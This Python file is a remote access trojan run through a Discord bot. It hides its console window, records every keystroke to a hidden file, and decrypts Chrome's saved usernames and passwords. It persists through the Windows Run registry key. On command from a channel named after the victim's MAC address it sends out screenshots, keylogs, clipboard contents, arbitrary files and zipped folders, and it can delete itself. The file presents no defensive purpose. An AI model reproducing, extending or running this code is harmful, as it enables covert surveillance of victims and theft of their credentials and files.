import pyautogui
import keyboard
import uuid
import discord
from discord.ext import commands
import subprocess
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import ctypes
from datetime import timezone, datetime, timedelta
import winreg as reg
import sys
import signal
import zipfile
from dotenv import load_dotenv

load_dotenv()

if sys.platform == "win32": 
    # Hide the console window
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def on_key_event(e):
    with open("d:/default.txt", "a") as file:
        if e.name in ['shift', 'ctrl', 'alt', 'esc', 'enter', 'backspace']:
            file.write(f" {e.name} ")
        else:
            file.write(f"{e.name}")
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ctypes.windll.kernel32.SetFileAttributesW("d:/default.txt", FILE_ATTRIBUTE_HIDDEN)

intents = discord.Intents.default()
intents.message_content = True  # Enables bot to read message content
intents.guilds = True  # Enables bot to manage guilds (servers)

# Create a bot instance with the specified intents
bot = commands.Bot(command_prefix="", intents=intents)

mac = ''.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join("d:/Administrator",
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
        
def get_password(user, profile):
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(f"c:/{user}", "AppData", "Local",
                            "Google", "Chrome", "User Data", profile, "Login Data")
    result = ""
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    try:
        shutil.copyfile(db_path, filename)
        # connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows
        
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                result  = result + f"Origin URL: {origin_url}\n"
                result  = result + f"Action URL: {action_url}\n"
                result  = result + f"Username: {username}\n"
                result  = result + f"Password: {password}\n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                result  = result + f"Creation date: {str(get_chrome_datetime(date_created))}\n"
            if date_last_used != 86400000000 and date_last_used:
                result  = result + f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
            result  = result + ("="*50)
            result = result + "\n\n"
        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass
        with open("gmail.txt", "a") as file:
            file.write(result)
        return 1
    except FileNotFoundError:
        return 0
    
    
def add_to_startup(app_name="main"):
    """Add the application to the Windows startup registry."""
    # If no file path is provided, use the path of the current 
    
    script_location = os.path.abspath(__file__)
    script_directory = os.path.dirname(script_location)
    
    # if file_path is None:
    #     file_path = os.path.abspath(sys.argv[0])
    
    # Registry key where startup programs are listed
    key = reg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    # Open the registry key with write access
    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    
    # Set the value in the registry to the path of the Python script
    reg.SetValueEx(open_key, app_name, 0, reg.REG_SZ, script_directory)
    
    # Close the registry key
    reg.CloseKey(open_key)

add_to_startup()

async def self_delete(ctx):
    try:
        # Get the current script file path
        file_path = os.path.abspath(sys.argv[0])

        # Create a batch file to delete the script
        batch_file = file_path + ".bat"
        with open(batch_file, "w") as bat:
            bat.write(f'@echo off\n')
            bat.write(f'timeout /t 1 /nobreak >nul\n')  # Wait for a few seconds
            bat.write(f'del "{file_path}"\n')  # Delete the script file
            bat.write(f'del "%~f0"\n')  # Delete the batch file itself

        # Run the batch file after this script exits
        await ctx.send(f"{file_path}")
        subprocess.Popen([batch_file], creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Error scheduling file deletion: {e}")

def kill_process():
    try:
        # Kill the current process after a delay to allow file deletion
        os.kill(os.getpid(), 9)
    except Exception as e:
        print(f"Error killing process: {e}")
        
def create_zip_archive(folder_path, zip_file_path):
    try:
        # Create a zip file
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Walk the directory and add files to the zip file
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Add file to zip with relative path
                    zipf.write(file_path, os.path.relpath(file_path, folder_path))
        print(f"Zip archive created successfully: {zip_file_path}")
    except Exception as e:
        print(f"Error creating zip archive: {e}")
    
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    guild = discord.utils.get(bot.guilds, name="Remotasks server")  # Replace with your server's name

    script_location = os.path.abspath(__file__)
    script_directory = os.path.dirname(script_location)
    os.chdir(script_directory)
    
    if guild:
        channel_name = mac  # Name of the channel you want to create

        # Check if the channel already exists
        existing_channel = discord.utils.get(guild.channels, name=channel_name)
        if not existing_channel:
            # Create the text channel
            new_channel = await guild.create_text_channel(channel_name)
            print(f'Channel "{channel_name}" created successfully!')
        else:
            print(f'Channel "{channel_name}" already exists.')
            
@bot.command()
async def screenshot(ctx):
    channel = ctx.channel
    if mac != channel.name:
        return
    screenshot = pyautogui.screenshot()

    screenshot.save("d:/screenshot.png")
    with open("d:/screenshot.png", "rb") as f:
        await ctx.send("Here is screenshot:", file=discord.File(f))
    os.remove('d:/screenshot.png')

@bot.command()
async def key(ctx):
    channel = ctx.channel
    if mac != channel.name:
        return
    with open("d:/default.txt", "rb") as f:
        await ctx.send("Here is key events:", file=discord.File(f))
    os.remove('d:/default.txt')
    
@bot.command()
async def clipboard(ctx):
    channel = ctx.channel
    if mac != channel.name:
        return
    with open("clipboard.txt", "rb") as f:
        await ctx.send("Here is clipboard events:", file=discord.File(f))
    with open('clipboard.txt', 'w') as file:
        # No need to write anything, opening in 'w' mode clears the file
        pass

@bot.command()
async def location(ctx):
    channel = ctx.channel
    if mac != channel.name:
        return
    script_location = os.path.abspath(__file__)
    await ctx.send(f'current location : "{script_location}"')
    
@bot.command()
async def ls(ctx):
    channel = ctx.channel
    if mac != channel.name:
        return
    result = subprocess.run('dir', shell=True, capture_output=True, text=True)

    print(result.stdout)
    await ctx.send(f'"{result.stdout}"')
    
@bot.command()
async def cd(ctx, *, path: str):
    channel = ctx.channel
    if mac != channel.name:
        return
    try:
        # Attempt to change the directory
        os.chdir(path)
        # Get the new current working directory
        new_directory = os.getcwd()
        await ctx.send(f"Directory changed to: {new_directory}")
    except FileNotFoundError:
        await ctx.send(f"Error: Directory '{path}' not found.")
    except NotADirectoryError:
        await ctx.send(f"Error: '{path}' is not a directory.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def upload(ctx, *, file_path: str):
    channel = ctx.channel
    if mac != channel.name:
        return
    if not os.path.isfile(file_path):
        await ctx.send(f"Error: File '{file_path}' not found.")
        return

    try:
        # Create a Discord File object and send it
        with open(file_path, 'rb') as file:
            await ctx.send(file=discord.File(file, os.path.basename(file_path)))
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
        
@bot.command()
async def zip(ctx, *, dir_path: str):
    channel = ctx.channel
    if mac != channel.name:
        return
    try:
        # Create a zip file
        with zipfile.ZipFile(os.path.basename("default.zip"), 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Walk the directory and add files to the zip file
            for root, dirs, files in os.walk(os.path.basename(dir_path)):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Add file to zip with relative path
                    zipf.write(file_path, os.path.relpath(file_path, os.path.basename(dir_path)))
        print(f"Zip archive created successfully: {os.path.basename("default.zip")}")
        with open(os.path.basename("default.zip"), 'rb') as file:
            await ctx.send(file=discord.File(file, os.path.basename(os.path.basename("default.zip"))))
        os.remove(os.path.basename("default.zip"))
        print(f"{os.path.basename("default.zip")} has been removed successfully.")
        # await ctx.send(file=discord.File(file, os.path.basename("default.zip")))
    except Exception as e:
        print(f"Error creating zip archive: {e}")
        
@bot.command()
async def kill(ctx):
    await self_delete(ctx)
    kill_process()
    await ctx.send(f"Successfully dead!")
        
@bot.command()
async def gmail(ctx, *, param: str):
    user, profile = param.split(' ', 1)

    channel = ctx.channel
    if mac != channel.name:
        return
    result = get_password(user, profile)
    if result == 1:
        with open("gmail.txt", "rb") as f:
            await ctx.send("Here is gmail infos:", file=discord.File(f))
        with open('gmail.txt', 'w') as file:
            # No need to write anything, opening in 'w' mode clears the file
            pass
    else:
        await ctx.send(f"File path isn't correct!")
        

keyboard.on_press(on_key_event)    

token = os.getenv('token')
    
bot.run(token) 